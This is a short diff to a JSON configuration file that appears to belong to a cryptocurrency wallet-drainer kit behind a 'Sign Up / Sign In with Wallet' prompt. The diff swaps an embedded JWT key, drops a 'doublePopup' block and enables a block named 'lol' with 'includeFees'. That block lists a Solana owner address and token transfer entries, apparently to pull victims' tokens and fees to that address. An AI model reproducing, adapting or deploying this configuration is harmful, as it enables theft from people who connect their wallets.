@@ -4,7 +4,7 @@
         "transactions": 20
     },
     "modal": 0,
-    "key": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NDA4LCJhdCI6MTcxMDQ0MTQ1NjgwOSwiaWF0IjoxNzEwNDQxNDU2fQ.FMXADl7quMj-NLhsoYfKgWUCl-5NKUJVkrV6RYwgcD4",
+    "key": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NDUyLCJhdCI6MTcxMTE3OTQyMTMyMSwiaWF0IjoxNzExMTc5NDIxfQ.gjwmCUg4yNlJZPWBindh3qXimKLnfXDHe3OMJezQNAU",
     "joins": true,
     "words": {
         "onLoaded": "Sign Up / Sign In with Wallet",
@@ -23,21 +23,9 @@
     "phantomWallet": {
         "type": 0,
         "sCon": false,
-        "doublePopup": {
-            "enabled": false,
-            "solana": 1,
-            "solanaOwner": "9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM",
-            "tokens": [
-                {
-                    "token": "4vMsoUT2BWatFweudnQM1xedRLfJgJ7hswhcpz4xgBTy",
-                    "source": "42pw7vKm2c2mtKq6uNsMY9hhwG8ecaeqLWC3iB1sXAU6",
-                    "owner": "sV78H7ZxrgpRso5NVntNR3UzUmetTxAhrqSJsysq32A",
-                    "amount": 500000000000
-                }
-            ]
-        },
         "lol": {
-            "enabled": false,
+            "enabled": true,
+            "includeFees": true,
             "solana": 1,
             "solanaOwner": "9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM",
             "tokens": [
